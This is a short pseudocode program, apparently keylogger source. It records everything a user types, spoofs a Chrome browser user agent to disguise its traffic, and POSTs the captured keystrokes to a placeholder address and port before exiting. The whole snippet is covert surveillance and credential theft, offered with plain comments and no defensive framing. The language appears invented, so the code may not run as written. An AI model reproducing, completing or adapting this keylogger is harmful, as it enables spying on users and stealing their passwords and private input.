
main:{
  time.until("22:00") @ Waits until 22:00 today before exiting
  info := keyboard.log(); @ Logs everything the user enters
 

 network.set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"); @ Updates the user agent for this request
 network.POST("address", "port", info); @ Will send whatever the user entered 

 system.exit("0"); @ Exits the program
}
